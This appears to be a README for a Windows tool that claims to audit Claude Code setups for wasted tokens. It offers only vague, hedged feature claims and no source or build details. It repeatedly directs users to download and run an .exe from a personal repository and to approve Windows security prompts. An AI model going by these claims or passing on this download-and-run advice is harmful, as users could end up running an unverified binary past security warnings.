# 🧠 claude-context-lint - Find wasted tokens fast

[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elyshafresh21/claude-context-lint)

## 🚀 Getting Started

Claude Context Lint helps you check your Claude Code setup and spot where token use may be too high. It is built for people who want a clear view of what is feeding into Claude’s context window.

Use it to review:
- files that get pulled in too often
- large prompts that may cost more tokens
- extra context that does not help the task
- MCP sources that may add noise
- setup patterns that can make Claude Code slower to work with

## 💻 What You Need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- a working internet connection
- access to your GitHub account if the project needs sign-in
- Claude Code already set up, if you want to audit a live setup
- enough free space for the app and your local project files

If you use Claude Code for day-to-day work, this tool can help you see what is going into each run and where waste may happen.

## 📥 Download and Install

Visit this page to download and run the tool:

https://github.com/elyshafresh21/claude-context-lint

### Steps for Windows

1. Open the link above in your browser.
2. Look for the latest release or the main download file.
3. Download the Windows file to your computer.
4. If the file comes in a ZIP folder, right-click it and choose Extract All.
5. Open the extracted folder.
6. Run the app file that matches Windows, such as an `.exe` file.
7. If Windows asks for permission, choose Yes.
8. If the app opens in a terminal window, leave it open while you use it.

### If You See a File Block

If Windows shows a security prompt, check the file name and confirm it came from the GitHub link above. Then allow it to run if you trust the source and the file matches what you downloaded.

## 🧭 How It Works

Claude Context Lint reads parts of your Claude Code setup and checks for common token waste patterns. It looks for things that can fill the context window without adding much value.

It can help you find:
- very large files included in context
- repeated instructions
- old notes that no longer matter
- broad folder picks that bring in too much content
- MCP entries that may add clutter
- prompt text that can be shortened

The goal is simple: keep the context cleaner so Claude has less noise to work through.

## 🛠️ First Run

After you open the app for the first time:

1. Point it at your Claude Code workspace.
2. Let it scan the files and setup data.
3. Review the lint results.
4. Look for items marked as high impact.
5. Fix the items that waste the most tokens first.
6. Run the scan again to see what changed.

If the app asks for a project path, choose the folder where you keep your Claude Code files.

## 📋 What It Checks

Claude Context Lint may review these areas:

- **Project files**: checks for files that are too large or not needed
- **Prompt content**: looks for long instructions that can be cut down
- **Context sources**: finds folders or files added to context by mistake
- **MCP setup**: reviews model context providers that may add extra data
- **Repeated text**: spots copy-pasted instructions across files
- **Unused rules**: finds setup rules that do not help current work

This gives you a simple view of what may slow Claude Code down or raise token use.

## 🔍 Reading the Results

The app may show results in a few groups:

- **High impact**: likely to waste many tokens
- **Medium impact**: worth checking next
- **Low impact**: smaller changes
- **Info**: useful details with no direct fix needed

Start with the high impact items. These usually give the best result with the least work.

## 🧹 Common Fixes

Here are the most common changes you may want to make:

- remove files that do not need to be in the context window
- split large instruction files into smaller parts
- delete old notes that no longer help
- narrow folder rules so Claude reads less
- trim repeated setup text
- review MCP sources and keep only what you use

These changes can make Claude Code easier to manage and can reduce wasted tokens during normal use.

## ⚙️ Typical Use Case

Use this tool when:
- Claude Code feels slow
- token use seems higher than expected
- prompts keep getting too large
- you add more files and want to check the impact
- you want a cleaner setup before sharing it with someone else

It works well as a quick check after you update a project or change your Claude Code rules.

## 📁 Suggested Folder Setup

For best results, keep your project organized like this:

- one folder for active work
- one folder for shared instructions
- one folder for archived notes
- one folder for tools and scripts

A clear folder layout makes it easier to see what should stay in context and what should stay out.

## 🔐 Privacy and Local Use

This kind of tool is most useful when it works on your own machine. Keep your setup files local and review what the app reads before you point it at a project. If you use private notes or company files, scan only the folder you need.

## 🧩 Helpful Tips

- Start with one project, not your whole drive
- Fix the biggest token waste first
- Keep instructions short and direct
- Remove duplicate rules
- Recheck after each change
- Use the scan again after adding MCP sources

Small changes can make the setup easier to read and easier to maintain.

## ❓ FAQ

### Do I need coding knowledge?
No. You only need to download the file, open it, and pick the folder you want to check.

### Does it change my files?
It should focus on auditing your Claude Code setup. You can review the results before you make any changes.

### Can I use it on more than one project?
Yes. You can run it on each project folder one at a time.

### What if I do not use MCP?
That is fine. The app can still check other parts of your setup, like prompt size and file scope.

### Will it help reduce token use?
It can help you find where tokens are being wasted so you can cut the parts that do not help.

## 🧪 Example Workflow

1. Open the app.
2. Choose your Claude Code folder.
3. Run the scan.
4. Look for large files, extra rules, and repeat text.
5. Remove or shorten the worst items.
6. Scan again.
7. Keep the changes that lower noise without losing needed context

## 📌 Project Topics

This project fits these areas:
- ai-tools
- anthropic
- claude
- claude-code
- cli
- context-window
- developer-tools
- linter
- mcp
- token-optimization

## 📎 Download Again

Use this link to visit the download page and run the file on Windows:

https://github.com/elyshafresh21/claude-context-lint